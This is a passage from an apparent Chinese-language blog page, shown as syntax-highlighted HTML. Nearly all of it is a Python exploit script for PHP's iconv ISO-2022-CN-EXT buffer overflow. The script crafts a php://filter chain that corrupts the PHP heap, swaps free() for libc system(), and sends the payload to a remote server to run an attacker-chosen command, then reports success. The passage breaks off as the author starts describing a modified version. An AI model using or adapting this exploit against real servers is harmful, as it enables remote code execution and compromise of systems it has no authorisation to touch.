number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>heaps<span class="token punctuation">&#125;</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> first        <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment">#self.check_vulnerable()</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>            ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>            ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>            CS <span class="token operator">=</span> <span class="token number">0x100</span>            <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>            step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>            <span class="token comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span>        <span class="token comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk "crash"</span>            step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>            step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>            step3_size <span class="token operator">=</span> CS            step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>            step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step3_size <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>BUG<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> BUG        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3_overflow<span class="token punctuation">)</span>            step4_size <span class="token operator">=</span> CS        step4 <span class="token operator">=</span> <span class="token string">b"=00"</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step4_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>        step4 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4<span class="token punctuation">)</span>            <span class="token comment"># This chunk will eventually overwrite mm_heap->free_slot</span>        <span class="token comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span>        step4_pwn <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            <span class="token number">0x200000</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token comment"># free_slot</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_CUSTOM_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x18</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            ADDR_HEAP<span class="token punctuation">,</span>  <span class="token comment"># 0x140</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token number">0</span><span class="token punctuation">,</span>            size<span class="token operator">=</span>CS<span class="token punctuation">,</span>        <span class="token punctuation">)</span>            step4_custom_heap <span class="token operator">=</span> ptr_bucket<span class="token punctuation">(</span>            ADDR_EMALLOC<span class="token punctuation">,</span> ADDR_EFREE<span class="token punctuation">,</span> ADDR_EREALLOC<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x18</span>        <span class="token punctuation">)</span>            step4_use_custom_heap_size <span class="token operator">=</span> <span class="token number">0x140</span>            COMMAND <span class="token operator">=</span> self<span class="token punctuation">.</span>command        COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"kill -9 $PPID; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            COMMAND <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"sleep </span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>sleep<span class="token punctuation">&#125;</span></span><span class="token string">; </span><span class="token interpolation"><span class="token punctuation">&#123;</span>COMMAND<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\x00"</span>            <span class="token keyword">assert</span> <span class="token punctuation">(</span>            <span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> step4_use_custom_heap_size        <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Command too big (</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>COMMAND<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">), it must be strictly inferior to </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        COMMAND <span class="token operator">=</span> COMMAND<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step4_use_custom_heap_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span>            step4_use_custom_heap <span class="token operator">=</span> COMMAND        step4_use_custom_heap <span class="token operator">=</span> qpe<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>        step4_use_custom_heap <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step4_use_custom_heap<span class="token punctuation">)</span>            pages <span class="token operator">=</span> <span class="token punctuation">(</span>            step4 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step4_pwn            <span class="token operator">+</span> step4_custom_heap            <span class="token operator">+</span> step4_use_custom_heap            <span class="token operator">+</span> step3_overflow            <span class="token operator">+</span> pad <span class="token operator">*</span> self<span class="token punctuation">.</span>pad            <span class="token operator">+</span> step1 <span class="token operator">*</span> <span class="token number">3</span>            <span class="token operator">+</span> step2_write_ptr            <span class="token operator">+</span> step2 <span class="token operator">*</span> <span class="token number">2</span>        <span class="token punctuation">)</span>            resource <span class="token operator">=</span> compress<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>pages<span class="token punctuation">)</span><span class="token punctuation">)</span>        resource <span class="token operator">=</span> b64<span class="token punctuation">(</span>resource<span class="token punctuation">)</span>        resource <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            filters <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token comment"># Create buckets</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>            <span class="token string">"zlib.inflate"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 0: Setup heap</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 1: Reverse FL order</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 2: Put fake pointer and make FL order back to normal</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 3: Trigger overflow</span>            <span class="token string">"dechunk"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.UTF-8.ISO-2022-CN-EXT"</span><span class="token punctuation">,</span>                        <span class="token comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span>            <span class="token string">"convert.quoted-printable-decode"</span><span class="token punctuation">,</span>            <span class="token string">"convert.iconv.latin1.latin1"</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span>        filters <span class="token operator">=</span> <span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>filters<span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filters<span class="token punctuation">&#125;</span></span><span class="token string">/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>resource<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            <span class="token keyword">return</span> path        <span class="token decorator annotation punctuation">@inform</span><span class="token punctuation">(</span><span class="token string">"Triggering..."</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        path <span class="token operator">=</span> self<span class="token punctuation">.</span>build_exploit_path<span class="token punctuation">(</span><span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">except</span> <span class="token punctuation">(</span>ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>sleep<span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]"</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> start <span class="token operator">+</span> self<span class="token punctuation">.</span>sleep <span class="token operator">&lt;=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span>            msg_print<span class="token punctuation">(</span><span class="token string">"    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]"</span><span class="token punctuation">)</span>                msg_print<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns data suitable for `zlib.inflate`.    """</span>    <span class="token comment"># Remove 2-byte header and 4-byte checksum</span>    <span class="token keyword">return</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">b64</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> base64<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> misalign <span class="token keyword">and</span> payload<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Misaligned: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">compressed_bucket</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Returns a chunk of size 0x8000 that, when dechunked, returns the data."""</span>    <span class="token keyword">return</span> chunked_chunk<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qpe</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Emulates quoted-printable-encode.    """</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>x<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ptr_bucket</span><span class="token punctuation">(</span><span class="token operator">*</span>ptrs<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Creates a 0x8000 chunk that reveals pointers after every step has been ran."""</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ptrs<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">==</span> size    bucket <span class="token operator">=</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>p64<span class="token punctuation">,</span> ptrs<span class="token punctuation">)</span><span class="token punctuation">)</span>    bucket <span class="token operator">=</span> qpe<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    bucket <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>bucket<span class="token punctuation">)</span>    <span class="token keyword">return</span> bucket<span class="token keyword">def</span> <span class="token function">chunked_chunk</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> size<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Constructs a chunked representation of the given chunk. If size is given, the    chunked representation has size `size`.    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.    """</span>    <span class="token comment"># The caller does not care about the size: let's just add 8, which is more than</span>    <span class="token comment"># enough</span>    <span class="token keyword">if</span> size <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">8</span>    keep <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token string">b"\n\n"</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token format-spec">x</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>size <span class="token operator">-</span> keep<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> size<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span> <span class="token operator">+</span> data <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Region</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A memory region."""</span>    start<span class="token punctuation">:</span> <span class="token builtin">int</span>    stop<span class="token punctuation">:</span> <span class="token builtin">int</span>    permissions<span class="token punctuation">:</span> <span class="token builtin">str</span>    path<span class="token punctuation">:</span> <span class="token builtin">str</span>        <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>stop <span class="token operator">-</span> self<span class="token punctuation">.</span>startExploit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于本人的脚本功力实在是烂，改完后的脚本